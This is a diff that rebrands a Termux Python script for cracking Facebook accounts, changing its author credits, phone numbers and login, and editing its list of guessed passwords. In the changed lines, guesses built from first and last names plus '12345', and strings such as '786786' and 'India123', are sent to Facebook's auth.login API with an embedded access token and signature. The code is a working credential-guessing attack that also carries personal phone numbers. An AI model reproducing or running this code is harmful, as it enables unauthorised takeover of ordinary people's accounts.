@@ -47,17 +47,18 @@ def jalan(z):
 
 
 #### LOGO ####
-logo = """\033[1;35m█████████
-\033[1;35m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
-\033[1;35m█\033[1;92m▼▼▼▼▼ \033[1;92m- _ --_--\033[0;31m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
-\033[1;35m█ \033[1;92m \033[1;92m_-_-- -_ --__\033[0;32m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
-\033[1;35m█\033[1;92m▲▲▲▲▲\033[1;92m--  - _ --\033[0;37m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[0;32  ASMART \033[0;37  TIPS
-\033[1;35m█████████      \033[1;91m«----------✧----------»
-\033[1;35m ██ ██
+logo = """
+
+\033[0;36m█╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
+\033[0;36m█║░██╔╝██║░░██║██╔══██╗████╗░██║
+\033[0;36m████═╝░███████║███████║██╔██╗██║
+\033[0;36m█╔═██╗░██╔══██║██╔══██║██║╚████║
+\033[0;36m█║░╚██╗██║░░██║██║░░██║██║░╚███║
+\033[0;36m═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
 \033[0;31m╔════════════════════════════════════════════╗
-\033[0;31m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|A.SMART.TIPS\033[0;31m            ║
-\033[0;31m║\033[0;36m* \033[0;36mGitHub  \033[1;36m : \033[1;31m\033[4mhttps://Github.com/ASmartTips\033[0m \033[0;31m ║
-\033[0;31m║\033[0;36m* \033[0;36mWhatsApp \033[1;36m: \033[1;31m0856-9101-5635\033[0;31m                 ║
+\033[0;31m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|WAHEED.KHAN.PATHAN\033[0;31m            ║
+\033[0;31m║\033[0;36m* \033[0;36mGitHub  \033[1;36m : \033[1;31m\033[4mhttps://Github.com/Waheedkhan00\033[0m \033[0;31m ║
+\033[0;31m║\033[0;36m* \033[0;36mWhatsApp \033[1;36m: \033[1;31m0311-9696-966\033[0;31m                 ║
 \033[0;31m╚════════════════════════════════════════════╝"""
 
 def tik():
@@ -77,13 +78,13 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print "\033[1;96m ============================================================="
-print  """\033[1;96m [¤] \x1b[0;36mASSALAMUALAIKUM\x1b[1;96m  \033[1;96m   [¤] \x1b[0;36mWHATSAPP : 085691015635\x1b[1;96m  
+print  """\033[1;96m [¤] \x1b[0;36mASSALAMUALAIKUM\x1b[1;96m  \033[1;96m   [¤] \x1b[0;36mWHATSAPP : 03119696966\x1b[1;96m  
 \033[1;96m [¤] \x1b[0;36mSELAMAT DATAMG\x1b[1;96m      [¤] \x1b[0;36mFACEBOOK : tools termux\x1b[1;96m  
-\033[1;96m [¤] \x1b[0;36mTOOLS BY AFZAL\x1b[1;96m  [¤] \x1b[0;36mYOUTUBE  : A Smart Tips\x1b[1;96m"""
+\033[1;96m [¤] \x1b[0;36mTOOLS BY AFZAL\x1b[1;96m  [¤] \x1b[0;36mYOUTUBE  : Waheed Khan Pathan\x1b[1;96m"""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "A"
-CorrectPassword = "A"
+CorrectUsername = "khan"
+CorrectPassword = "khan"
 
 loop = 'true'
 while (loop == 'true'):
@@ -336,7 +337,7 @@ def pilih_super():
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
-					pass2 = b['first_name']+'1234'
+					pass2 = b['first_name']+'12345'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
@@ -350,7 +351,7 @@ def pilih_super():
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
-							pass3 = ('Bharat')
+							pass3 = ('786786')
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
@@ -378,7 +379,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = b['last_name']+'1234'
+											pass5 = b['last_name']+'12345'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -392,7 +393,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = ('indian')
+													pass6 = ('India123')
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -406,7 +407,7 @@ def pilih_super():
 															cek.close()
 															cekpoint.append(user+pass6)
 														else:
-															pass7 = ('Mahadev')
+															pass7 = ('Bharat123')
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
